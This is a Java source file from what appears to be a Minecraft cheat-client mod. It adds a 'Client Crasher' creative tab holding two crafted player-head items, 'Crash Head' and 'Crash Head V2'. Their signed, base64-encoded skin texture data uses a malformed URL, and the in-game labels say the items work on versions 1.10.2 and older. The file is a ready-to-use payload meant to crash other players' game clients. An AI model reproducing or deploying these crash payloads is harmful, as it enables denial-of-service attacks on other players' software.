package me.nekosarekawaii.foxglove.creativetab.impl;

import de.florianmichael.viafabricplus.protocolhack.ProtocolHack;
import me.nekosarekawaii.foxglove.creativetab.CreativeTab;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.NbtCompound;
import net.minecraft.nbt.NbtList;
import net.minecraft.text.Text;
import net.minecraft.util.Formatting;
import net.raphimc.vialoader.util.VersionEnum;

import java.util.Collection;

public class ClientCrasherCreativeTab extends CreativeTab {

    public ClientCrasherCreativeTab() {
        super(new ItemStack(Items.BARRIER).setCustomName(Text.literal("Client Crasher")));
    }

    @Override
    public Collection<ItemStack> entries() {
        final Collection<ItemStack> current = super.entries();

        final VersionEnum targetVersion = ProtocolHack.getTargetVersion();

        if (targetVersion.isOlderThan(VersionEnum.r1_11)) {

            // This head uses a value that has an empty string as url.
            final ItemStack crashHead = new ItemStack(Items.PLAYER_HEAD);
            final NbtCompound nbt = new NbtCompound();
            final NbtCompound skullOwner = new NbtCompound();
            final NbtCompound properties = new NbtCompound();
            final NbtList textures = new NbtList();
            final NbtCompound data = new NbtCompound();
            data.putString("Signature", "RlOgHNDlW3KdoWBda6VoMWqvD21ESva9BC6DvexuutaLdBwLuFpf/5kHVnQV6DcjbON9A8H4QY1D9GiYly468B+KzSpTRo/JeyDYr96uQc9RTq+U62uxxcDodgo4d465RJtx7TXIzVJX00OQqX1xHU3q6Lquk+iV4QFHRd/O3nzFVt8d2iWyArshMtXUZTtoGPthK8JrbWHI+EHBWNfSFU4MM40yD/7BCC/Td23x4LGP+gm4y6N2PyD6WLolGD8qXzRW5T5UMTbABU1/e6V/nAPYz7dTDuGVCh+x9qCDWt0a7Du6/31wo67mKysHD7Jp5QL/AT/uuP6N+DGi2/HeWDZJwm+cdH93mpCmK74cO71m/FwCBuC3QxI8GfhtXkS22dI+5bMEbLTMcrWyWwM1+7nciXQA/CGtmZpSCfiJI595nX4pmIG2YVCVy9OzVsnIjNt0vL5UfIJasWu3GkIOepuHeaE9HZ/Vw/XWncGBEAURitbPeRZj2slSTPoP1sx3J5LrObCY8L1HqazMLYeX5VulR49YJmg7PEQUsi/mQJAwj0xnHx7bCPWiNcMNOFHUoAUF1MDGZvSmiw7cfMClOpp+wzJB1kWnDRQmoCXnsk5nX2wYqiXXqJ6TkuOKk7BhiKjUtTVSv9eyUn2xZfcn9nxcolr0fmNH+brDAsVIMug=");
            data.putString("Value", "ewogICJ0aW1lc3RhbXAiIDogMTY4ODYwNjcyODYzNywKICAicHJvZmlsZUlkIiA6ICJhNDAxNDkxYTAwZTI0OGVmYTZmZjcxMjI2Y2ZhNzU1NCIsCiAgInByb2ZpbGVOYW1lIiA6ICJlZDBjaW5VIiwKICAic2lnbmF0dXJlUmVxdWlyZWQiIDogdHJ1ZSwKICAidGV4dHVyZXMiIDogewogICAgIlNLSU4iIDogewogICAgICAidXJsIiA6ICIiLAogICAgICAibWV0YWRhdGEiIDogewogICAgICAgICJtb2RlbCIgOiAic2xpbSIKICAgICAgfQogICAgfQogIH0KfQ==");
            textures.add(data);
            properties.put("textures", textures);
            skullOwner.putIntArray("Id", new int[]{-1543419622, 14829807, -1493208798, 1828353364});
            skullOwner.put("Properties", properties);
            skullOwner.putString("Name", "ed0cinU");
            nbt.put("SkullOwner", skullOwner);
            crashHead.setNbt(nbt);
            this.putClientsideName(crashHead,
                    Text.literal(
                            Formatting.DARK_RED + Formatting.BOLD.toString() + "Crash Head"
                    ),
                    Text.literal(
                            Formatting.YELLOW + Formatting.BOLD.toString() + "Working at <= 1.10.2 (needs to be placed in versions older than 1.8.0)"
                    )
            );
            current.add(crashHead);

            // This head uses a value that has " .minecraft.net" as url.
            final ItemStack crashHeadV2 = new ItemStack(Items.PLAYER_HEAD);
            final NbtCompound nbtV2 = new NbtCompound();
            final NbtCompound skullOwnerV2 = new NbtCompound();
            final NbtCompound propertiesV2 = new NbtCompound();
            final NbtList texturesV2 = new NbtList();
            final NbtCompound dataV2 = new NbtCompound();
            dataV2.putString("Signature", "RlOgHNDlW3KdoWBda6VoMWqvD21ESva9BC6DvexuutaLdBwLuFpf/5kHVnQV6DcjbON9A8H4QY1D9GiYly468B+KzSpTRo/JeyDYr96uQc9RTq+U62uxxcDodgo4d465RJtx7TXIzVJX00OQqX1xHU3q6Lquk+iV4QFHRd/O3nzFVt8d2iWyArshMtXUZTtoGPthK8JrbWHI+EHBWNfSFU4MM40yD/7BCC/Td23x4LGP+gm4y6N2PyD6WLolGD8qXzRW5T5UMTbABU1/e6V/nAPYz7dTDuGVCh+x9qCDWt0a7Du6/31wo67mKysHD7Jp5QL/AT/uuP6N+DGi2/HeWDZJwm+cdH93mpCmK74cO71m/FwCBuC3QxI8GfhtXkS22dI+5bMEbLTMcrWyWwM1+7nciXQA/CGtmZpSCfiJI595nX4pmIG2YVCVy9OzVsnIjNt0vL5UfIJasWu3GkIOepuHeaE9HZ/Vw/XWncGBEAURitbPeRZj2slSTPoP1sx3J5LrObCY8L1HqazMLYeX5VulR49YJmg7PEQUsi/mQJAwj0xnHx7bCPWiNcMNOFHUoAUF1MDGZvSmiw7cfMClOpp+wzJB1kWnDRQmoCXnsk5nX2wYqiXXqJ6TkuOKk7BhiKjUtTVSv9eyUn2xZfcn9nxcolr0fmNH+brDAsVIMug=");
            dataV2.putString("Value", "ewogICJ0aW1lc3RhbXAiIDogMTY4ODYwNjcyODYzNywKICAicHJvZmlsZUlkIiA6ICJhNDAxNDkxYTAwZTI0OGVmYTZmZjcxMjI2Y2ZhNzU1NCIsCiAgInByb2ZpbGVOYW1lIiA6ICJlZDBjaW5VIiwKICAic2lnbmF0dXJlUmVxdWlyZWQiIDogdHJ1ZSwKICAidGV4dHVyZXMiIDogewogICAgIlNLSU4iIDogewogICAgICAidXJsIiA6ICIgLm1pbmVjcmFmdC5uZXQiLAogICAgICAibWV0YWRhdGEiIDogewogICAgICAgICJtb2RlbCIgOiAic2xpbSIKICAgICAgfQogICAgfQogIH0KfQ==");
            texturesV2.add(dataV2);
            propertiesV2.put("textures", texturesV2);
            skullOwnerV2.putIntArray("Id", new int[]{-1543419622, 14829807, -1493208798, 1828353364});
            skullOwnerV2.put("Properties", propertiesV2);
            skullOwnerV2.putString("Name", "ed0cinU");
            nbtV2.put("SkullOwner", skullOwnerV2);
            crashHeadV2.setNbt(nbtV2);
            this.putClientsideName(crashHeadV2,
                    Text.literal(
                            Formatting.DARK_RED + Formatting.BOLD.toString() + "Crash Head V2"
                    ),
                    Text.literal(
                            Formatting.YELLOW + Formatting.BOLD.toString() + "Working at <= 1.10.2 (needs to be placed in versions older than 1.8.0)"
                    )
            );
            current.add(crashHeadV2);

        }

        return current;
    }

}
